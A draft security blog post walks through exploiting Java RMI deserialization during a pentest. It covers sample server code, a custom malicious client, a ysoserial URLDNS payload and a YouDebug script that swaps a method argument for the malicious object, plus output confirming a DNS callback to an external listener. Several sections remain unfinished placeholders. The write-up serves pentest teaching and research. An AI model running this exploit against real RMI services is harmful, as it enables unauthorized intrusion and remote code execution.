---
layout: post
title: Tale of RMI Exploitation in 2021
tags: [Exploitation, Reference]
author: Ingredous Labs
comment: true
---

## Introduction
The aim of this blog post is two-fold. The first goal is to provide a detailed walkthrough of how Remote Code Execution was achieved by Deserialization via RMI. While the second goal is to provide supporting evidence of how providing source code during an engagement will yield many more findings which wouldn't have been possible to find otherwise.

This blog post was made possible due to the fantastic research of Hans-Martin Münch in their blog post [Attacking Java RMI Services After JEP 290](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/).[1] 

## RMI TL;DR
As the basics of RMI's inner-workings and how it can be exploited has been extensively covered in the past, this section will provide a very quick high level overview for those who might be unfamiliar with the service. References will be provided at the end of the section to resources which cover this in far greater detail.

RMI stands for Remote Method Invocation and is a Java propietary protocol. RMI is practically the object-oriented equivalent of RPC (Remote Procedure Call) and was developed to allow developers to implement client/server applications in Java. The basic functionality of RMI is that it allows an object running in one Java application (the client) to invoke methods on an object running in another Java application (the server).

RMI consists of three components:
- Server
- Client
- Registry

The responsiblity of the server is to export a remote object and bind an instance of it to the registry using a name. The registry itself is used as a lookup service (similar to how DNS works) which allows the client to lookup a name of the object instance which was bound by the server. Finally if the registry locates the instance of the object, the reference to the object (living on the server) is returned to the client. The reference that's returned to the client is known as the stub.

In order to allow the instance of the server-side object to be remotely interactable, the server must define an interface which extends the [Remote interface](https://docs.oracle.com/javase/7/docs/api/java/rmi/Remote.html#:~:text=The%20Remote%20interface%20serves%20to,rmi.)[2]. Within this interface, be sure to provide the empty method definitions for the methods which will be available to be remotely called.

The interface that's defined must be known by both the client and the server.

Lastly, the RMI Registry can be on a separate host from the server, however its quite common to spawn the registry on the same host from where the server is running especially if there is only one application binding services to the registry. The RMI registry is typically spawned on Port 1099 however this can be left to the developer's discreation. Finally the service (interface) which is bound to the registry, by default uses a random port however this can be specified by the developer.

The following diagram provides a high level overview of the information described above:
![Screenshot]({{ site.baseurl }}/images/posts/2020/rmi/diagram.png)

## JEP 290
2016 was a bad year for RMI as it was discovered by Moritz Bechler that it was possible to leverage exploitation in the RMI Registry by passing in a malicious serialized object as a parameter to the `bind` method of the naming registry. In order to exploit this vector, an RMI Registry must be accessible over the Internet and if so an attacker would be able to write a client which would attempt to bind a malicious object to the registry. However its not fairly common for the registry to be exposed over the Internet but rather living in the intranet. This appears to be corroborated by Shodan because as of the time of writing this post, there are only 7,030 instances of RMI Registries which can be access over the Internet. 

Although if an attacker is able to gain access to the internal network as a result of other means, if a host running the RMI Registry was to be discovered this could have resulted in an easy pivot (especially for red-team engagements).

In response to this, Java released [JEP 290](https://openjdk.java.net/jeps/290)[3] shortly after Belcher's research. Due to the severity of the vulnerability, JEP 290 was backported to several older Java versions as well. JEP 290 introduced serialization filters which essentially mitigated this exploitation technique.

## Exploitation after JEP 290
It was discovered that it was possible to exploit RMI on the application level. Due to how RMI works, upon the client invoking a method on the stub which contains arguments, these arguments are then serialized when sent over the wire which are then deserialized on the receiving end. If the method accepts an non-primitive type argument such as Strings and Objects in Java, the `.readObject()` method is called on the argument. 

An example of such a method is shown below:

```java
String convertDate(Date today) throws RemoteException;
```

As such if a method is discovered that can be remotely invoked and accepts a non-primitive type, this can result in exploitation via deserialization as a malicious object can be passed.  However as mentioned in Hans-Martin Münchs research, an update released in January 2020 mitigated this exploitation technique in scenarios where Strings are passed as arguments. 

The caveat here however is that an attacker will need to know how the interface which is used by the RMI service was implemented in order to have knowledge of the methods which allow for arbitrary objects to be passed.

## Method Signatures
The way that RMI determines which method should be invoked on the server by the client is by using method signatures. The way that method signatures work is that RMI generates a SHA1 hash using the method name, return type, and the argument types. The names of the arguments themselves don't make a difference. This process is done both on the client and server side. Upon the client call a method, the hashes are compared and if one matches that respective method is invoked. 

As mentioned in the section above, in a blackbox scenario where the attacker doesn't have knowledge on how the interface was implemented it would be pretty much impossible to leverage exploitation.

In response to this, [RMIScout](https://github.com/BishopFox/rmiscout)[4] was released by BishopFox which bruteforces the method signatures of exposed RMI Interfaces to guess the method implementations. The way `RMIScout` works is by using a wordlist of signatures along with wordlist of common method names and parameter lists to attempt to determine whether such a method definition exists. Apart from the signature bruteforcing functionality, if a method is indeed discovered which is deemed vulnerable the tool can be used to leverage exploitation.

As such the method signature bruteforcing functionality of `RMIScout` is typically used as a last resort in black-box scenarios where source code is not made available.

## Exploitation Discovery
During a recent pentest engagement, it was discovered that there was a method which accepts an arbitary object as an argument. However the finding was only made possible due to the developers providing the source code. Without the source code, this would have been impossible to discover due to how the developers implemented RMI in this context.

Please note: the actual implementations of code shown below has been severely modified to protect the integrity of the assessment.

An interface was discovered which extends from `Remote`:

`IExampleServiceReg.java`:

```java
1. package RMIExploitationDemo;
2. 
3. import java.rmi.Remote;
4. import java.rmi.RemoteException;
5. 
6. public interface IExampleServiceReg extends Remote {
7.     ExampleService getService(String id) throws RemoteException;
8. }
```

The interface defines the `getService()` method which accepts an argument of type String and returns a type of `ExampleService`.

`ExampleService.java`:

```java
package RMIExploitationDemo;

import java.rmi.Remote;

public interface ExampleService extends Remote {
}
```

Afterwards, the implemenation of this interface was examined:

`ExampleServiceRegImpl.java`:

```java
1. package RMIExploitationDemo;
2. 
3. import java.rmi.RemoteException;
4. import java.rmi.server.UnicastRemoteObject;
5. import java.util.HashMap;
6. import java.util.Map;
7. 
8. public class ExampleServiceRegImpl extends UnicastRemoteObject implements IExampleServiceReg {
9.     private Map items = new HashMap();
10. 
11.     protected ExampleServiceRegImpl() throws RemoteException {
12.         ServiceA a = new ServiceA(2099);
13.         items.put("Service A", a);
14.         ServiceB b = new ServiceB(3000);
15.         items.put("Service B", b);
16.     }
17. 
18.     public ExampleService getService(String id) throws RemoteException {
19.         return (ExampleService) items.get(id);
20.     }
21. }
22. 
```

As shown above, a map by the name of `items` is initalized. Further on when the constructor is called, two new objects are instantiated which are of types `ServiceA` and `ServiceB`. The respective instances of these objects are then stored in the `items` map. Finally the `getService()` method is concretely implemented which returns a value from the `items` HashMap associated with the key which is the passed-in String. The instances of these objects which were stored in the `items` map will be further explored shortly.

Taking a closer look at how the server binds the remote object to the registry:

`Server.java`:

```java
1. package RMIExploitationDemo;
2. 
3. import java.rmi.Naming;
4. import java.rmi.registry.LocateRegistry;
5. 
6. public class Server {
7.     public static void main(String[] args) {
8.         try {
9.             LocateRegistry.createRegistry(1099);
10.             Naming.bind("example-service", new ExampleServiceRegImpl());
11.         } catch (Exception e) {
12.             e.printStackTrace();
13.         }
14.     }
15. }
```

An RMI Registry was spawned on port 1099, a the server registered the object to the registry with the name of `example_service`.

This can be confirmed by running the NSE `rmi-dumpregistry` script using nmap which connects to a remote RMI registry and attempts to dump all of its objects:

```sh
$ nmap --script rmi-dumpregistry -p1099 localhost

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 10:50 PDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00022s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE
1099/tcp open  rmiregistry
| rmi-dumpregistry:
|   example-service
|      implements java.rmi.Remote, RMIExploitationDemo.IExampleServiceReg,
|     extends
|       java.lang.reflect.Proxy
|       fields
|           Ljava/lang/reflect/InvocationHandler; h
|             java.rmi.server.RemoteObjectInvocationHandler
|             @192.168.1.3:61867
|             extends
|_              java.rmi.server.RemoteObject

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```

The scan output shows that nmap discovered the registered name of the object `example-service` along with the name of the interface `IExampleServiceReg`. It's also shown that the object was bound to Port 61867:

`@192.168.1.3:61867`

As shown in the `IExampleServiceReg` interface, the only method that the client-side stub will be able to interact with is `getItem()`. The `getItem()` was concretely implemented in the `ExampleServiceRegImpl` in which its functionality was to return a value from the `items` map which held instances of two objects.

Let's take a closer look at those two objects and their associated classes.

`ServiceA.java`:

```java
1. package RMIExploitationDemo;
2. 
3. import java.rmi.RemoteException;
4. import java.util.Date;
5. 
6. public class ServiceA extends RemoteService implements IServiceA {
7. 
8.     public ServiceA(int port) throws RemoteException {
9.         super(port);
10.     }
11. 
12.     public void createOrder(int id, String name, Date today) throws RemoteException {
13.        // logic for creating order
14.         System.out.println("Order created");
15.     }
16. 
17.     public int returnOrderId(String name) throws RemoteException {
18.         // logic for returning order id
19.         return 1337;
20.     }
21. 
22.     public String returnOrderName(int id) throws RemoteException {
23.         // logic for returning order name
24.         return "genericname";
25.     }
26. }
27. 
```

`ServiceA` inherits from `RemoteService` and implements the `IServiceA` interface thus providing a concerete implementation the `createOrder()` method which was defined in the interface.

Taking a look at the `IServiceA` interface reveals:

`IServiceA.java`:

```java
1. package RMIExploitationDemo;
2. 
3. import java.rmi.RemoteException;
4. import java.util.Date;
5. 
6. public interface IServiceA extends ExampleService {
7.     void createOrder(int id, String name, Date today) throws RemoteException;
8.     int returnOrderId(String name) throws RemoteException;
9.     String returnOrderName(int id) throws RemoteException;
10. }
```

Also looking at `RemoteService` which is the parent class from which `ServiceA` inherits from:

`RemoteService.java`:

```java
1. package RMIExploitationDemo;
2. 
3. import java.rmi.RemoteException;
4. import java.rmi.server.RMIClientSocketFactory;
5. import java.rmi.server.RMIServerSocketFactory;
6. import java.rmi.server.UnicastRemoteObject;
7. 
8. public class RemoteService extends UnicastRemoteObject implements ExampleService {
9. 
10.     protected RemoteService() throws RemoteException {
11.     }
12. 
13.     protected RemoteService(int port) throws RemoteException {
14.         super(port);
15.     }
16. 
17.     protected RemoteService(int port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf) throws RemoteException {
18.         super(port, csf, ssf);
19.     }
20. }
21. 
```

To quickly break down the behavior of synergy of the three classes shown above:

1. The `IServiceA` interface inherits from the `ExampleService` interface. Which in turn the `ExampleService` interface inherits from the `Remote` interface thus making the `IService` interface into a remote interface. 
2. `ServiceA` implements the `IServiceA` interface and inherits from the `RemoteService` class which in-turn inherits from `UnicastRemoteObject` therefore allowing an instance of the object to be remote and interacted with via the client.

It may sound a bit confusing but basically it grants the client the ability to interact with the instance of `ServiceA` that is stored in the `items` map. As such the client is able to call the methods which have been defined in the `IServiceA` interface and implemented in the `ServiceA` class.

The `ServiceB` class is implemented identically as its `ServiceA` counterpart although defines a different set of methods which can be called. As none of the methods are vulnerable meaning they do not accept arbitrary objects, they will not be explored for the sake of brevity. 

The reason behind why the developers stored the instances of the `ServiceA` and `ServiceB` objects in the map is because the instances can now behave as singletons. Instead of having each individual service bound to the registry, the server can now bind one service which will have a method (`getService()`) that is responsible for returning a specific instance. Now the client will need to only intialize one stub and can return the instance of the service they need without having to worry about re-initalizing it. As mentioned earlier, since the interfaces of `ServiceA` and `ServiceB` inherit from the `ExampleService` interface and both `ServiceA` and `ServiceB` inherit from `RemoteService`, the instances and their respective methods are able to be remotely invoked.

A diagram which highlights this process:

[show diagram here]

It was mentioned earlier in the post that the actual object is bound to a random port however for the developer to have control over this (especially in scenarios where firewalls with strict inegress/egress filtering exist). Because of this, it's shown that the constructor belongs to `ServiceA` inturn calls the constructor of its parent class which is `RemoteService` and passes in a port. `RemoteService` then takes the port and does the same thing and calls the constructor of its parent class which is `UnicastRemoteObject` passing in the port therefore binding the remote object to the port specified.

Finally, notice something pecuilar about one of the methods in the `IServiceA` interface? 

`void createOrder(int id, String name, Date today) throws RemoteException;`

The `createOrder()` method shown above allows for an arbitrary object aka an object of type `Date` to be passed thus resulting in deserialization. 

## Writing the Malicious RMI Client

Shown earlier in the post, there are various tools such as `RMIScout` which can help automate the process of exploiting vulnerable methods. While these tools are fantastic, none of them will work out of the box in this scenario due to how RMI was implemented.

As such a custom RMI client will need to be written in order to leverage exploitation.

To quickly re-cap how this client will work:
1. Connect to the RMI Registry
2. Lookup the remote object by its name which in this case would be `example-service`
3. Return the `example-service` stub
4. Call the `.getService()` method on the stub to return the instance of `ServiceA`
5. Call the `.createOrder()` method on the instance of `ServiceA` and pass in a malicious object in the place of the `Date` object.

Here is a rough draft of how the client implementation will look. Further on in the post this snippet will be built upon in order to turn it in to a fully fledged exploit.

`Client.java`

```java
1 package RMIClientDemo;
2 
3 import java.rmi.NotBoundException;
4 import java.rmi.RemoteException;
5 import java.rmi.registry.LocateRegistry;
6 import java.rmi.registry.Registry;
7 
8 public class Client {
9     public static void main(String[] args) throws RemoteException, NotBoundException {
10         Registry naming = LocateRegistry.getRegistry("localhost", 1099);
11         IExampleServiceReg example_service = (IExampleServiceReg) naming.lookup("example-service");
12         System.out.println(example_service.getService("test"));
13     }
14 
15 }
16 
```

Shown on Line 10, `naming` is instantiated which obtains the remote object registry. Afterwards on Line 11, the client queries the registry for the `example-service` and the returned stub is cast of type `IExampleServiceReg` and is initialized as `example_service`. This means that `example_service` is able to call the methods which are defined in the `IExampleServiceReg` interface. 

It was mentioned earlier in the blog post, that the client will need to know the interface which is defined by the server. As such, the `IExampleServiceReg` interface will need to be created on the client-side as well (the contents of the interface are shown above).

As shown in the `IExampleServiceReg` interface, the `getService()` method will have a return type of `ExampleService`. In this scenario `ExampleService` is an interface and in order for the client to compile, the `ExampleService` interface must be created as well.

Lastly on Line 12, the stub now calls the `getService()` method with an arbitrary String just to confirm the client has the ability to interact with the stub.

However when running the client, the following error is thrown:
![Screenshot]({{ site.baseurl }}/images/posts/2020/rmi/error.png)

This error occurs because the `IExampleServiceReg` interface which was created on the server side lives in a different package on the client-side. Due to this, RMI is unable to locate the interface on the client-side as its looking for it using the path which corresponds with the one on the server-side.

This can be confirmed by taking a closer look at the error:

```
java.lang.ClassNotFoundException: RMIExploitationDemo.IExampleServiceReg
```

To fix this, create a new package on the client-side which matches the name of the server-side package. In this scenario, the package name would be `RMIExploitationDemo` and place the `IExampleServiceReg` interface into this package.

**As such, it is imperative that the package name of the interface which is defined in the client must match the package name defined on the server.**

Also as the `getService()` method in the `IExampleServiceReg` interface has a return type of `ExampleService`. The `ExampleService` interface will also need to be created in a package which matches the implementation of the server side.

Finally, the client project will look as the following:
![Screenshot]({{ site.baseurl }}/images/posts/2020/rmi/rmirproject.png)

[change this] After running the client, `null` should be returned and this is a good sign as a `map` in Java will return `null` if a value is not found that's associated with the key which was searched.

The next step is to implement the logic which will call the `getService()` method on the `ServiceA` instance which will be retrieved from the map.

In order to do this, the interface which `ServiceA` implements aka `IServiceA` will need to be added to the client. Just like the `IExampleServiceReg` interface, the packages names will need to match.

Once that's done, the following code can be added to the client:

```java
1. IServiceA svc_a = (IServiceA) example_service.getService("Service A");
2. svc_a.createOrder(1, "Random", new Date());
```

On Line 1, the String `Service A` is passed in as a parameter to the `getService()` method. The reason the String `Service A` is passed because it was shown earlier in `ExampleServiceRegImpl.java` that this is the key which is assocated with the `ServiceA` instance which was stored in the `items` map:

```java
items.put("Service A", a);
```

The returned value is cast as type `IServiceA` and is intialized as the `svc_a` variable. 
On Line 2, `svc_a` then calls the `createOrder()` method passing it the required parameters.

To test whether the client is able to succesfully pull the `ServiceA` instance, start the server and run the client. As the `ServiceA` implementation on the server-side contains a print statement, it will be printed in the server's console if all works well:

![Screenshot]({{ site.baseurl }}/images/posts/2020/rmi/printstatement.png)

In order to leverage exploitation, the bengign `Date` object which the method expects needs to be replaced with a malicous serialized object. In order to generate the malicious serial object, [ysoserial](https://github.com/frohoff/ysoserial)[5] will be used.

The best gadget to use for probing whether deserialization exists is the `URLDNS` gadget. This is because this gadget is included in the standard Java library and doesn't require any external dependencies. Upon the malicious object being successfully deserialized and the gadget called, this will invoke a DNS Lookup. This all depends on whether the vulnerable server has the ability to invoke DNS Lookups and nothing standing in its way such as egress filtering by the firewall. 

Once the `ysoserial` jar has been downloaded, add it as a library to the client project's classpath. Once `ysoserial` has been added the malicious object can be generated using the following code:

```java
Object malicious_obj = new URLDNS().getObject("http://9b3459444e240a2a8575fe5f6adb.ns.pingb.in");
```

The argument that's being passed to the `getObject()` method is the location of the DNS Listener. There are several different types of listeners which can be used including Burp Collaborator, DNSBin, Pingb.in and many more. Ensure to prepend `http://` to the DNS Listener host as it's required by the `URLDNS` gadget.

The RMI Client code at the current moment looks as the following:

```java=
1. package RMIClientDemo;
2. 
3. import RMIExploitationDemo.IExampleServiceReg;
4. import RMIExploitationDemo.IServiceA;
5. import ysoserial.payloads.URLDNS;
6. 
7. import java.rmi.NotBoundException;
8. import java.rmi.RemoteException;
9. import java.rmi.registry.LocateRegistry;
10. import java.rmi.registry.Registry;
11. import java.util.Date;
12. 
13. public class Client {
14.     public static void main(String[] args) throws Exception {
15. 
16.         Object malicious_obj = new URLDNS().getObject("http://9b3459444e240a2a8575fe5f6adb.ns.pingb.in");
17.         Registry naming = LocateRegistry.getRegistry("localhost", 1099);
18.         IExampleServiceReg example_service = (IExampleServiceReg) naming.lookup("example-service");
19.         IServiceA svc_a = (IServiceA) example_service.getService("Service A");
20.         svc_a.createOrder(1337, "Random", new Date());
21.     }
22. 
23. }
```

As shown on Line 16, the malicious serialized object is generated and will need to be replace the `Date` object on Line 20.

However this is harder than it looks and here's why.

If the `Date` object is just replaced with the malicous object, a compiler error will be introduced:

![Screenshot]({{ site.baseurl }}/images/posts/2020/rmi/compile-error.png)

As suggested by IDEA, the `malicious_obj` can be attempt to be cast as a `Date` object therefore fixing the compile error:

```java
svc_a.createOrder(1, "Random", (Date) malicious_obj);
```

Though now when running the client, a new runtime error is introduced and that's because the `malicious_obj` which is a `HashMap` cannot be cast a `Date` object:

![Screenshot]({{ site.baseurl }}/images/posts/2020/rmi/runtime-error.png)

Lastly what if the `IServiceA` interface (on the client-side) is modified to allow for a `HashMap` object to be passed? Well earlier in the post specificially the `Method Signatures` section, it was mentioned that the client and server generate method signatures of the interface when invoking an RMI method. If the method signatures don't match, then the method will not be invoked. By changing the type of the argument in which the method expects, this will in turn change the method signature therefore [change this].

There are different techniques to get around this, however the most simplest way is to write a proxy which will intercept the RMI call on the network level and swap the bengign object with the malicious object. [change this]. This is the technique in which [BaRMIe](https://github.com/NickstaDB/BaRMIe/)[6] uses. However `BaRMIe` wouldn't work in this scenario for two reasons:

1. `BaRMIe`  would need to be extended in order to work with this specific RMI scenario. This is because the remote interface which is bound to the registry is not vulnerable to exploitation, but rather an instance which can be retrieved by calling a specific method on the stub. As such, `BaRMIe` would need to be patched in order to support this workflow.
2. `BaRMIe` only supports a specific set of gadgets, and `URLDNS` is not one of them. 

Hans-Martin Münch discovered that it was possible to use [YouDebug](https://youdebug.kohsuke.org/)[7] which is a 'non-interactable' Java debugger that provides a scriptable debugger which is wrapped around the Java Debugging Interface (JDI). In their article [ATTACKING JAVA RMI SERVICES AFTER JEP 290](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/), Hans-Martin provides an example script which searches all arguments for a 'needle` and then replaces it with the malicious object generated by ysoserial.

In layman's terms this will replace the parameters that are passed to the RMI call before the client has a chance to serialize them. This is done by writing a small script that will set a break point, generate a malicious `ysoserial` object and finally replace the malicious object with the harmless `Date` object. The script has been modified to work with this exact scenario and is shown below:

`pwn.groovy`:

```java
1. // MODIFIED FROM SOURCE: https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/
1. def payloadName = "URLDNS";
2. def payloadCommand = "http://http://d1af66997310af6302b4fc41c19a.ns.pingb.in";
3. 
4. println "Loaded..."
5. 
6. vm.methodEntryBreakpoint("java.rmi.server.RemoteObjectInvocationHandler", "invokeRemoteMethod") {
7. 
8.   println "[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called"
9. 
10.   // make sure that the payload class is loaded by the classloader of the debugee
11.   vm.loadClass("ysoserial.payloads." + payloadName);
12. 
13.   // get the Array of Objects that were passed as Arguments
14.   delegate."@2".eachWithIndex { arg,idx ->
15.    if (arg[0].toString().contains("1337")) {
16.         println "[+] Replacing Date object with malicous object!" 
17. 		// Create a new instance of the ysoserial payload in the debuggee
18.         def payload = vm._new("ysoserial.payloads." + payloadName);
19.         def payloadObject = payload.getObject(payloadCommand)
20. 	   
21.         vm.ref("java.lang.reflect.Array").set(delegate."@2",2, payloadObject);
22.         println "[+] Done.."	
23.      }
24.   }
25. }
```

To quickly explain the behavior of the script:

- Line 14 starts iterating through the arguments of each method. As there are two remote methods called in the RMI client:

```java
    IServiceA svc_a = (IServiceA) example_service.getService("Service A");
    svc_a.createOrder(1337, "Random", new Date());
```

- Line 15 verifies that the first argument's value once converted to a String) is 1337. This is done because the object which will be replaced is in the second method, and not the first.

- If the value is indeed equal to 1337, then the malicious object is generated on Lines 18 & Lines 19.

- Line 21 swaps the third argument (since array indexes start 0) aka the `Date` object with the malicious object.

In order to allow `YouDebug` to hook into the RMI Client, the RMI Client will need to be started with remote debugging support. This can be achieved by passing the following value as a VM option:

`-agentlib:jdwp=transport=dt_socket,server=y,address=127.0.0.1:8000`

One quick thing to note is that ensure that the `ysoserial` library exists in the RMI Client's classpath when compiling the client. 

Once all said is done, start the RMI Client and notice it hangs as its waiting for the debugger to connect on Port 8000:

![Screenshot]({{ site.baseurl }}/images/posts/2020/rmi/hanging.png)

Run `YouDebug` with the following arguments passing it the `pwn.groovy` script which was created earlier:

`$ java -jar youdebug.jar -socket localhost:8000 pwn.groovy`

The following output will be shown:

```
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by org.codehaus.groovy.reflection.CachedClass$3$1 (file:/private/tmp/rmi-exploitation/youdebug.jar) to method java.lang.Object.finalize()
WARNING: Please consider reporting this to the maintainers of org.codehaus.groovy.reflection.CachedClass$3$1
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
Loaded...
[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called
[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called
[+] Replacing Date object with malicous object!
[+] Done..
```

As there are two remote methods being invoked in the RMI Client, `java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called` will be shown twice.
Finally the print statement will be shown that the `Date` object has been swapped with the malicious object.

If all goes well, the output of the `RMI Client` should contain the following stack trace as an exception should've been thrown:

```
Exception in thread "main" java.lang.IllegalArgumentException: java.lang.ClassCastException@2d93291
	at sun.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:357)
	at sun.rmi.transport.Transport$1.run(Transport.java:200)
	at sun.rmi.transport.Transport$1.run(Transport.java:197)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
  <snipped for brevity>
	at RMIClientDemo.Client.main(Client.java:19)
```

Like in the majority of Java deserializations, if the `java.lang.ClassCastException` is thrown this is a great sign as it means the malicious object was deserialized. In this scenario, the malicious object was deserialized on the server-side and thus the gadget executed.

This is confirmed as when checking the DNS Listener a lookup was infact invoked:
![Screenshot]({{ site.baseurl }}/images/posts/2020/rmi/invoked.png)

As deserialization is indeed possible, the next steps for an attacker would to be to determine if a dependency exists in the application's classpath which contains a vulnerable gadget supported by `ysoserial` and leverage Remote Code Execution. If no such dependency exists, the attacker would need to build their own gadget chain.

## Wrapping Things Up

[todo]

## Conclusion

## References

[1] https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290
[2] https://docs.oracle.com/javase/7/docs/api/java/rmi/Remote.html
[3] https://openjdk.java.net/jeps/290
[4] https://github.com/BishopFox/rmiscout
[5] https://github.com/frohoff/ysoserial
[6] https://github.com/NickstaDB/BaRMIe
[7] https://youdebug.kohsuke.org
